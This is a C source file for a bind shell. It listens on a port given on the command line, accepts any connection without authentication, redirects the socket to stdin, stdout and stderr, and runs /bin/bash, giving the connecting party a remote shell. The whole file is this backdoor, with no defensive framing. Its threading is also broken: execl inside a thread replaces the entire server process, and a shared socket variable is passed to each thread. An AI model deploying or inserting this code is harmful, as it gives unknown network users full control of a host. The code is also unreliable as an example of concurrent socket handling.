#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <pthread.h>

#define BUFFER_SIZE 1024

void *handle_client(void *arg) {
    int client_socket = *(int *)arg;

    // Redirect stdin, stdout, and stderr to the client socket
    dup2(client_socket, 0);  // Redirect stdin
    dup2(client_socket, 1);  // Redirect stdout
    dup2(client_socket, 2);  // Redirect stderr

    // Execute the desired command or program
    execl("/bin/bash", "/bin/bash", NULL);

    // If execl fails, inform the client
    const char *error_message = "Command execution failed";
    send(client_socket, error_message, strlen(error_message), 0);
    close(client_socket);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <port>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    int port = atoi(argv[1]);
    if (port < 1 || port > 65535) {
        fprintf(stderr, "Invalid port number. Port must be between 1 and 65535.\n");
        exit(EXIT_FAILURE);
    }

    int server_fd, client_socket;
    struct sockaddr_in server_address, client_address;
    socklen_t client_address_length = sizeof(client_address);

    // Create socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == -1) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Prepare the server address
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY;
    server_address.sin_port = htons(port);

    // Bind the socket to the specified IP and port
    if (bind(server_fd, (struct sockaddr *)&server_address, sizeof(server_address)) == -1) {
        perror("Socket binding failed");
        exit(EXIT_FAILURE);
    }

    // Listen for incoming connections
    if (listen(server_fd, 5) == -1) {
        perror("Socket listening failed");
        exit(EXIT_FAILURE);
    }

    printf("Server listening on port %d...\n", port);

    while (1) {
        // Accept a client connection
        client_socket = accept(server_fd, (struct sockaddr *)&client_address, &client_address_length);
        if (client_socket == -1) {
            perror("Accepting client connection failed");
            continue;
        }

        printf("Client connected\n");

        // Create a new thread to handle the client's input/output
        pthread_t tid;
        if (pthread_create(&tid, NULL, handle_client, &client_socket) != 0) {
            perror("Failed to create thread");
            close(client_socket);
        }

        // Detach the thread to automatically clean up resources
        pthread_detach(tid);
    }

    // Close the server socket
    close(server_fd);

    return 0;
}
